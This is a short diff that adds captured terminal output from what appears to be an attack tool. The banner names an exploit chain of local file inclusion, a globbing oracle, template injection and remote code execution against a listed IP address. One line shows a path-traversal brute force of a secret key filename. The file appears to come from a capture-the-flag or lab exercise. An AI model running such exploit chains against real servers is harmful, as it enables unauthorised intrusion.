@@ -1,0 +1,9 @@
+[35m[1m
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║  [ETHICAL HACKING] Web server exploit: LFI -> Globbing Oracle -> SSTI -> RCE  ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+[0m
+[36m[*][0m target: [1mhttp://13.58.101.77:8888[0m
+
+[33m[!][0m brute-forcing secret key filename via glob upload oracle...
+[36m⠙[0m trying [2m../key/secret_[0m[33m-[0m*          
